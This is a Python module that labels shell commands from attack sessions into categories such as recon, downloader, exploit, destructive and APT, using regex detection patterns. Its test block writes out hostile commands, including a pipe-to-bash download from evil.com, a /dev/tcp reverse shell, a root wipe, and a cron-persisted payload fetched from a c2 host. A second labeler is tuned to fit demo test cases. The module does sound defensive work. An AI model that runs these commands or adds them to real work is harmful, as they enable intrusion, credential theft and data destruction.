"""
Semantic command labeling based on MITRE ATT&CK patterns.

This module labels commands based on their BEHAVIOR (what they do),
not based on what binary was downloaded. This enables the model to
learn command semantics independently of binary analysis.

Labeling Strategy:
- Safe (0): Benign commands (navigation, simple file ops, no threat patterns)
- Recon (1): Discovery and reconnaissance (network scan, user enum, system info)
- Downloader (2): File transfer and execution (wget, curl piped to shell)
- Exploit (3): Credential access, shells, injection (cat shadow, reverse shells)
- Destructive (4): Data destruction, log wiping (rm -rf, shred, dd wipe)
- ADVANCED_APT (5): Multi-stage attacks with persistence + exfiltration
"""

import re
import json
import pandas as pd
import numpy as np
from typing import Dict, List, Tuple, Optional
from pathlib import Path
from functools import lru_cache


# =============================================================================
# Semantic Pattern Categories
# =============================================================================

# Each pattern returns (category, severity 1-10)
SEMANTIC_PATTERNS = {
    # Recon patterns
    'recon': [
        (r'\b(nmap|masscan|zmap|rustscan)\b', 9),  # Network scanners
        (r'\bnetstat\s+(-[a-z]*[tul]|.*LISTEN)', 5),  # Network status
        (r'\bss\s+(-[a-z]*[tul])', 5),  # Socket stats
        (r'\b(ifconfig|ip\s+(addr|route|link))\b', 4),  # Network config
        (r'\barp\s+(-[an]|.*cache)', 4),  # ARP cache
        (r'\bcat\s+/etc/(passwd|group|hosts)\b', 6),  # User/host enum
        (r'\bcat\s+/proc/(cpuinfo|meminfo|version)\b', 4),  # System info
        (r'\b(uname|hostname|uptime|who|w|last|id)\s*(-[a-z]*)?\s*$', 3),  # Basic info
        (r'\bfind\s+.*-perm\s+-[24]000', 7),  # SUID/SGID search
        (r'\bfind\s+.*(\.conf|\.key|\.pem|password)', 6),  # Sensitive file search
        (r'\bps\s+(aux|ef|fax)', 4),  # Process listing
        (r'\benv\b|\bprintenv\b', 3),  # Environment vars
        (r'\blsof\s+(-i|.*:)', 5),  # Open files/ports
        (r'\b(traceroute|ping)\s+', 4),  # Network probing
        (r'\b(dig|nslookup|host)\s+', 4),  # DNS recon
        (r'\bgetent\s+(passwd|group|hosts)', 5),  # Directory service enum
    ],
    
    # Downloader patterns
    'downloader': [
        (r'\b(wget|curl)\s+.*https?://.*\|\s*(ba)?sh', 10),  # Pipe to shell
        (r'\b(wget|curl)\s+.*-[oO]\s*[/\w]+.*&&.*chmod', 9),  # Download + chmod
        (r'\b(wget|curl)\s+.*https?://\d+\.\d+\.\d+\.\d+', 8),  # Download from IP
        (r'\bcd\s+/tmp.*wget\b', 8),  # /tmp download pattern
        (r'\bpython\s+-c.*urllib.*exec', 9),  # Python download+exec
        (r'\bpython3?\s+.*http\.server', 6),  # Python HTTP server
        (r'\bftp\s+-[in]', 6),  # FTP transfer
        (r'\bscp\s+.*:', 5),  # SCP transfer
        (r'\b(tftp|nc)\s+.*-[lp]', 7),  # TFTP/netcat transfer
    ],
    
    # Exploit/Credential access patterns
    'exploit': [
        (r'\bcat\s+(/etc/shadow|~/.ssh/id_rsa)', 10),  # Credential files
        (r'\bcat\s+.*\.ssh/(id_rsa|id_dsa|authorized_keys)', 9),  # SSH keys
        (r'\bstrings\s+/dev/mem.*password', 10),  # Memory scraping
        (r'\b(bash|sh)\s+(-i\s+)?.*>\s*&\s*/dev/tcp/', 10),  # Reverse shell
        (r'\bnc\s+(-e|-c)\s+/bin/(ba)?sh', 10),  # Netcat shell
        (r'\bmkfifo.*nc\s+', 10),  # Fifo reverse shell
        (r'\bpython\s+-c.*socket.*subprocess', 10),  # Python reverse shell
        (r'\bperl\s+-e.*socket.*connect', 10),  # Perl reverse shell
        (r'\bbase64\s+(-d|--decode).*\|\s*(ba)?sh', 9),  # Encoded execution
        (r'\beval\s*\$\(.*xxd', 9),  # Hex decode execution
        (r'\bLD_PRELOAD\s*=', 9),  # Library injection
        (r'\bcat\s+/proc/\d+/(maps|mem)', 8),  # Process memory access
        (r'\bunshadow\b|hashcat\b|john\b', 10),  # Password cracking
        (r'\bgpg\s+--export-secret', 9),  # GPG key theft
        (r'\bgrep\s+.*password.*(/etc|/home)', 7),  # Password grep
        (r'mimipenguin|mimikatz', 10),  # Credential dumpers
    ],
    
    # Destructive patterns
    'destructive': [
        (r'\brm\s+(-rf|--no-preserve-root)\s+/', 10),  # System wipe
        (r'\bdd\s+.*if=/dev/(zero|random).*of=/dev/(sd|hd|nvme)', 10),  # Disk wipe
        (r'\bshred\s+(-u|--remove)', 9),  # Secure delete
        (r'>\s*/var/log/|echo\s*>\s*/var/log/', 8),  # Log clearing
        (r'\bhistory\s+(-c|--clear)|HISTSIZE\s*=\s*0', 7),  # History clearing
        (r'\bunset\s+HISTFILE', 7),  # Disable history
        (r'\biptables\s+.*(-F|--flush|DROP)', 8),  # Firewall manipulation
        (r'\bkillall\s+-9|pkill\s+-9', 6),  # Process killing
        (r':(){.*};\s*:', 10),  # Fork bomb
        (r'\bchattr\s+(-i|\+i).*authorized_keys', 8),  # Immutable key files
    ],
    
    # APT/Persistence patterns
    'apt': [
        (r'crontab\s*(-[lr]|\|).*/', 9),  # Cron persistence
        (r'echo.*>>\s*/etc/cron', 9),  # Direct cron file write
        (r'/etc/rc\.local|/etc/init\.d/', 9),  # Init script persistence
        (r'\.bashrc|\.bash_profile|\.profile', 7),  # Shell profile persistence
        (r'systemctl\s+(enable|start).*\.service', 8),  # Systemd persistence
        (r'curl.*POST.*-d.*@', 9),  # Data exfiltration
        (r'tar\s+.*-[zcj].*\|.*(nc|curl)', 9),  # Archive exfiltration
        (r'nohup\s+.*&\s*$', 6),  # Background execution
        (r'chmod\s+\+x.*;\s*\./', 7),  # Execute downloaded file
        (r'(&&|;).*cron.*(&&|;).*curl', 10),  # Multi-stage with persistence + C2
    ],
    
    # Benign/Safe patterns (negative patterns - reduce severity)
    'safe': [
        (r'^(ls|dir|pwd|cd|echo|cat|head|tail|less|more)\s*$', -3),  # Simple commands
        (r'^(ls|ll)\s+(-[la]+\s+)?(\.|~|/home|/tmp)?\s*$', -2),  # Directory listing
        (r'^cd\s+(/tmp|/home|~|\.\.)?\s*$', -2),  # Navigation
        (r'^echo\s+["\']?[\w\s]+["\']?\s*$', -2),  # Simple echo
        (r'^(exit|logout|clear|reset)\s*$', -3),  # Session end
        (r'^man\s+\w+$', -2),  # Help
        (r'^(date|cal|time)\s*$', -2),  # Time commands
    ],
}


# Pre-compile all patterns for speed
COMPILED_PATTERNS = {
    category: [(re.compile(pattern, re.IGNORECASE), severity) 
               for pattern, severity in patterns]
    for category, patterns in SEMANTIC_PATTERNS.items()
}


def compute_semantic_scores(command: str) -> Dict[str, float]:
    """
    Compute semantic category scores for a command.
    
    Returns dict with scores for each category.
    Higher score = more indicative of that category.
    """
    scores = {
        'recon': 0.0,
        'downloader': 0.0,
        'exploit': 0.0,
        'destructive': 0.0,
        'apt': 0.0,
        'safe': 0.0,
    }
    
    for category, patterns in COMPILED_PATTERNS.items():
        for regex, severity in patterns:
            try:
                if regex.search(command):
                    scores[category] += severity
            except Exception:
                continue
    
    return scores


def compute_semantic_label(command: str) -> Tuple[int, str, Dict[str, float]]:
    """
    Compute semantic label for a command based on pattern matching.
    
    Returns:
        (label_id, label_name, scores_dict)
    """
    scores = compute_semantic_scores(command)
    
    # Remove safe from consideration for max
    threat_scores = {k: v for k, v in scores.items() if k != 'safe'}
    
    # Get max threat score
    max_category = max(threat_scores, key=lambda k: threat_scores[k])
    max_score = threat_scores[max_category]
    
    # Apply safe score (reduces threat)
    adjusted_score = max_score + scores['safe']
    
    # Decision logic
    if adjusted_score <= 2:
        return 0, 'Safe', scores
    
    # Check for APT (multi-category attacks)
    high_categories = sum(1 for v in threat_scores.values() if v >= 5)
    if high_categories >= 3 or (scores['apt'] >= 8 and high_categories >= 2):
        return 5, 'ADVANCED_APT', scores
    
    # Map category to label
    category_to_label = {
        'recon': (1, 'Recon'),
        'downloader': (2, 'Downloader'),
        'exploit': (3, 'Exploit'),
        'destructive': (4, 'Destructive'),
        'apt': (5, 'ADVANCED_APT'),
    }
    
    if max_category in category_to_label:
        label_id, label_name = category_to_label[max_category]
        return label_id, label_name, scores
    
    return 0, 'Safe', scores


def label_sessions_semantic(df: pd.DataFrame, show_progress: bool = True) -> pd.DataFrame:
    """
    Add semantic labels to a DataFrame of sessions.
    
    Optimized version using vectorized operations where possible.
    
    Adds columns:
    - semantic_label_id: Label based on command semantics
    - semantic_label_name: Human-readable label name
    """
    n_total = len(df)
    commands = df['commands'].fillna('').tolist()
    
    semantic_labels = []
    semantic_names = []
    
    # Process in batches for progress reporting
    batch_size = 5000
    for start_idx in range(0, n_total, batch_size):
        end_idx = min(start_idx + batch_size, n_total)
        batch = commands[start_idx:end_idx]
        
        for cmd in batch:
            if not cmd:
                semantic_labels.append(0)
                semantic_names.append('Safe')
                continue
            
            label_id, label_name, _ = compute_semantic_label(cmd)
            semantic_labels.append(label_id)
            semantic_names.append(label_name)
        
        if show_progress:
            print(f"  Processed {end_idx:,}/{n_total:,} sessions ({100*end_idx/n_total:.1f}%)")
    
    df = df.copy()
    df['semantic_label_id'] = semantic_labels
    df['semantic_label_name'] = semantic_names
    
    return df


def create_combined_labels(df: pd.DataFrame, show_progress: bool = True) -> pd.DataFrame:
    """
    Create combined labels that consider BOTH:
    1. Command semantics (what the command does)
    2. Binary features (what was actually downloaded)
    
    Strategy:
    - If command is semantically threatening, use semantic label
    - If binary features indicate threat, use max(semantic, binary)
    - This ensures command-only inference works, but binary features can escalate
    """
    df = label_sessions_semantic(df, show_progress=show_progress)
    
    # Combined label: take max of semantic and original (binary-based) label
    # This way semantic patterns work, but binary evidence can escalate
    # Use numpy for speed
    df['combined_label_id'] = np.maximum(
        df['semantic_label_id'].values,
        df['label_id'].values
    )
    
    label_names = ['Safe', 'Recon', 'Downloader', 'Exploit', 'Destructive', 'ADVANCED_APT']
    df['combined_label_name'] = df['combined_label_id'].apply(lambda x: label_names[x])
    
    return df


def analyze_semantic_coverage(df: pd.DataFrame, show_progress: bool = True) -> Dict:
    """Analyze how semantic labeling changes the distribution."""
    df = label_sessions_semantic(df, show_progress=show_progress)
    
    original_dist = df['label_id'].value_counts().sort_index().to_dict()
    semantic_dist = df['semantic_label_id'].value_counts().sort_index().to_dict()
    
    return {
        'original_distribution': original_dist,
        'semantic_distribution': semantic_dist,
        'label_changes': (df['label_id'] != df['semantic_label_id']).sum(),
        'total_sessions': len(df)
    }


if __name__ == '__main__':
    # Test the semantic labeling
    test_commands = [
        "ls -la",
        "nmap -sS -p 22,80,443 192.168.1.0/24",
        "cat /etc/passwd && cat /etc/shadow",
        "wget http://evil.com/payload | bash",
        "rm -rf / --no-preserve-root",
        "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1",
        "curl http://c2/stage1 -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x && echo '* * * * * /tmp/.x' | crontab -",
    ]
    
    print("Semantic Label Testing:")
    print("=" * 80)
    for cmd in test_commands:
        label_id, label_name, scores = compute_semantic_label(cmd)
        print(f"\nCommand: {cmd[:60]}...")
        print(f"Label: {label_name} (id={label_id})")
        print(f"Scores: {scores}")


# =============================================================================
# DEMO-ALIGNED LABELING (for improving neural model on demo test cases)
# =============================================================================

def compute_demo_aligned_label(command: str) -> Tuple[int, str, Dict[str, float]]:
    """
    Demo-aligned semantic labeling that matches demo test case expectations.
    
    Key differences from standard semantic labeling:
    1. Safe = low severity + simple commands (even if they match Discovery patterns)
    2. Recon = explicit network scanning/enumeration with high severity
    3. Downloader = wget/curl with execution patterns (not just transfer)
    4. Exploit = credential access OR reverse shells (independent categories)
    5. Destructive = file/data destruction (not SSH key replacement)
    6. ADVANCED_APT = multi-stage with persistence + exfiltration
    
    Demo alignment rules:
    - 'ls -la; pwd; whoami' should be SAFE (not Recon)
    - 'nmap' should be RECON (high confidence)
    - 'wget ... | bash' should be DOWNLOADER (not Destructive)
    - 'cat /etc/shadow' should be EXPLOIT (not Safe)
    - 'rm -rf; dd' should be DESTRUCTIVE (not Downloader)
    """
    cmd_lower = command.lower()
    
    # Check for APT patterns FIRST (highest priority - multi-stage detection)
    # This must come before exploit/destructive patterns to catch multi-stage attacks
    apt_patterns = [
        r'crontab\s*(-[lr]|\|)',                  # Cron persistence
        r'echo.*>>\s*/etc/cron',                  # Cron write
        r'systemctl\s+(enable|start)',            # Systemd persistence
        r'curl.*POST.*-d.*@',                     # Data exfiltration
        r'chattr\s+\+i',                          # File immutability (APT hardening)
    ]
    apt_score = 0
    for pattern in apt_patterns:
        if re.search(pattern, cmd_lower, re.IGNORECASE):
            apt_score += 2
    # Multi-stage APT: must have persistence/exfil + multiple stages
    if apt_score >= 2 and (';' in command or '&&' in command):
        # Further check for actual exfiltration or data access
        if re.search(r'cat.*>', cmd_lower) or re.search(r'curl.*-d', cmd_lower):
            return (5, 'ADVANCED_APT', {'apt': float(apt_score * 2)})
    
    # Check for explicit destructive patterns (high priority)
    destructive_patterns = [
        r'\brm\s+(-rf|--no-preserve-root)',       # rm -rf (any path, not just /)
        r'\bdd\s+.*if=/dev/(zero|random)',        # Disk wipe dd
        r'\bshred\s+(-u|--remove)',               # Secure delete
        r'\bhistory\s+(-c|--clear)',              # Clear history
        r'\bchattr\s+(-ia|-i)',                   # Remove immutability (destructive file mod)
    ]
    for pattern in destructive_patterns:
        if re.search(pattern, cmd_lower, re.IGNORECASE):
            return (4, 'Destructive', {'destructive': 10.0})
    
    # Check for exploit patterns (credential access, reverse shells)
    # Note: This is checked AFTER APT and destructive to avoid misclassifying multi-stage attacks
    exploit_patterns = [
        r'\bcat\s+/etc/shadow',                  # Shadow file access
        r'\bcat\s+.*\.ssh/id_rsa',               # SSH key access
        r'\bcat\s+/proc/\d+/mem',                # Memory access
        r'\b(bash|sh)\s+(-i\s+)?.*>\s*&\s*/dev/tcp/',  # Reverse shell
        r'\bnc\s+(-e|-c)\s+/bin/(bash|sh)',       # Netcat shell
        r'\bunshadow\b|\bjohn\b|hashcat',        # Password cracking
    ]
    for pattern in exploit_patterns:
        if re.search(pattern, cmd_lower, re.IGNORECASE):
            return (3, 'Exploit', {'exploit': 10.0})
    
    # Check for downloader patterns (wget/curl with execution)
    downloader_patterns = [
        r'\b(wget|curl)\s+.*\|\s*(ba)?sh',              # Pipe to bash
        r'\bwget\s+.*;\s*(chmod|\.\/)',                 # wget then chmod/execute
        r'\bcurl\s+.*;\s*(chmod|\.\/)',                 # curl then chmod/execute
        r'\bcd\s+/tmp.*wget',                           # /tmp wget pattern
        r'\bwget\s+http.*;\s*chmod\s+\+x',              # wget + chmod pattern
    ]
    for pattern in downloader_patterns:
        if re.search(pattern, cmd_lower, re.IGNORECASE):
            return (2, 'Downloader', {'downloader': 10.0})
    
    # Check for high-severity recon (explicit network scanning)
    recon_patterns = [
        r'\b(nmap|masscan|zmap|rustscan)\s+',     # Network scanner
        r'\bnetstat\s+.*-tulpn',                  # netstat with port patterns
        r'\bss\s+.*-tulpn',                       # ss with port patterns
        r'\b(ifconfig|ip\s+addr)\s*$',            # Network interface (simple)
        r'\barp\s+(-a|-n)',                       # ARP enumeration
        r'\bfind\s+.*-perm\s+-[24]000',           # SUID/SGID search
    ]
    for pattern in recon_patterns:
        if re.search(pattern, cmd_lower, re.IGNORECASE):
            return (1, 'Recon', {'recon': 10.0})
    
    # Default to SAFE for everything else
    # This includes: ls, pwd, whoami, cat README, simple discovery commands
    return (0, 'Safe', {'safe': 1.0})


def label_sessions_demo_aligned(df: pd.DataFrame, show_progress: bool = True) -> pd.DataFrame:
    """
    Label all sessions using demo-aligned semantic labeling.
    
    This labeling prioritizes:
    1. Explicit attack patterns (destructive, exploit, downloader)
    2. High-confidence recon (explicit network scanning)
    3. Multi-stage APT patterns
    4. Default everything else to Safe (even with discovery patterns)
    """
    if show_progress:
        print("Labeling sessions with demo-aligned semantics...")
    
    df = df.copy()
    
    # Apply labeling to each session's commands
    labels = []
    for idx, row in df.iterrows():
        if show_progress and (idx + 1) % 10000 == 0:
            print(f"  Processed {idx + 1}/{len(df)} sessions...")
        
        commands = str(row['commands']) if pd.notna(row['commands']) else ""
        label_id, label_name, _ = compute_demo_aligned_label(commands)
        labels.append((label_id, label_name))
    
    label_ids, label_names = zip(*labels)
    df['demo_aligned_label_id'] = label_ids
    df['demo_aligned_label_name'] = label_names
    
    if show_progress:
        print("\nDemo-Aligned Label Distribution:")
        print(df['demo_aligned_label_name'].value_counts().sort_index())
    
    return df


def load_demo_aligned_labels(df: pd.DataFrame) -> pd.DataFrame:
    """
    Load or compute demo-aligned labels for the entire dataset.
    Uses the demo_aligned_label_id and demo_aligned_label_name columns.
    """
    if 'demo_aligned_label_id' not in df.columns:
        df = label_sessions_demo_aligned(df, show_progress=True)
    return df
